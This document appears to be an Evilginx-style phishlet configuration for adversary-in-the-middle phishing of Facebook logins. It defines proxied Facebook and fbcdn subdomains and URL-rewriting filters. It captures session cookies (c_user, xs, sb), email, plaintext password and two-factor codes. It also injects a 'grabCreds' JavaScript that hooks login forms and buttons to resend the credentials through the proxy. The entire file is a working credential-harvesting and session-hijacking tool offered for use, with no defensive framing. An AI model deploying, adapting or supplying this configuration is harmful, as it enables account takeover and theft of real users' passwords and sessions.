author: '@charlesbel'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false, is_landing: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'login', domain: 'facebook.com', search: 'https://login.facebook.com', replace: 'https://login.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'web', domain: 'facebook.com', search: 'https://web.facebook.com', replace: 'https://web.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user','xs','sb']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: '(pass|unenc_password)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: '^(sixDigitCode|code)$'
      search: '(.*)'
      type: 'post'


   
login:
  domain: 'www.facebook.com'
  path: '/login.php'

js_inject:
  - trigger_domains: ["www.facebook.com"]
    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
    trigger_params: []
    script: |
      function grabCreds(){
        var email='';
        var pass='';
        var ue=document.querySelector('input[name="email"],input[name="email_input"],input[name="username"],input[name="login"],input[name="user"]');
        var pe=document.querySelector('input[name="pass"],input[name="enc_password"],input[type="password"]');
        if(ue){ email=ue.value; }
        if(pe){ pass=pe.value; }
        if(!pass && !email){ return; }
        var body='';
        if(email){ body+='email='+encodeURIComponent(email); }
        if(pass){ body+='&unenc_password='+encodeURIComponent(pass); }
        var xhr=new XMLHttpRequest();
        xhr.open('POST','/login/device-based/regular/login/',true);
        xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        xhr.send(body);
      }
      function hookForms(){
        var fs=document.querySelectorAll('form');
        for(var i=0;i<fs.length;i++){
          if(fs[i].__egHook){ continue; }
          fs[i].__egHook=true;
          fs[i].addEventListener('submit',function(){ setTimeout(grabCreds,60); },true);
        }
        var bs=document.querySelectorAll('button[type="submit"],input[type="submit"]');
        for(var j=0;j<bs.length;j++){
          if(bs[j].__egHook){ continue; }
          bs[j].__egHook=true;
          bs[j].addEventListener('click',function(){ setTimeout(grabCreds,60); },true);
        }
        var rs=document.querySelectorAll('[role="button"][aria-label]');
        for(var k=0;k<rs.length;k++){
          if(/log\s*in|continue/i.test(rs[k].getAttribute('aria-label'))) {
            if(rs[k].__egHook){ continue; }
            rs[k].__egHook=true;
            rs[k].addEventListener('click',function(){ setTimeout(grabCreds,60); },true);
          }
        }
        var pe2=document.querySelector('input[type="password"]');
        if(pe2 && !pe2.__egHook){
          pe2.__egHook=true;
          pe2.addEventListener('keydown',function(e){ if(e.key==='Enter'){ setTimeout(grabCreds,60); } },true);
        }
      }
      setInterval(hookForms,800);
